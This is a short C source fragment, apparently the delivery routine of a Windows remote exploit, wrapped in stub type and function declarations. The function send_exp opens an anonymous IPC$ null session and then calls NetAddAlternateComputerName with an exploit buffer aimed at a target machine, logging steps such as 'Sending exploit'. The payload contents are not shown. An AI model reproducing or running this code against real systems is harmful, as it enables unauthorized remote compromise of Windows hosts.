
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_3__ TYPE_1__ ;


struct TYPE_3__ {char* lpRemoteName; int dwType; int * lpProvider; int * lpLocalName; } ;
typedef TYPE_1__ NETRESOURCE ;


 scalar_t__ ERROR_SUCCESS ;
 int NetAddAlternateComputerName (int ,int ,int *,int *,int ) ;
 int RESOURCETYPE_ANY ;
 scalar_t__ WNetAddConnection2 (TYPE_1__*,char*,char*,int ) ;
 int exit (int) ;
 int expl_uni ;
 int ipc ;
 int printf (char*) ;
 int tgt_net_uni ;

void send_exp() {
 NETRESOURCE _IPC_;

 _IPC_.lpLocalName = ((void*)0);
 _IPC_.lpProvider = ((void*)0);
 _IPC_.dwType = RESOURCETYPE_ANY;
 _IPC_.lpRemoteName = (char*)&ipc;
 printf("[+] Setting up IPC$ session...\n");
 if (WNetAddConnection2(&_IPC_,"","",0)!=ERROR_SUCCESS) {
  printf("[x] Couldn't establish IPC$ connection.\n");
  exit (1);
 }
 printf("[*] IPC$ session setup successfully!\n");
 printf("[+] Sending exploit ...\n");

 NetAddAlternateComputerName(tgt_net_uni, expl_uni ,((void*)0),((void*)0),0);

}
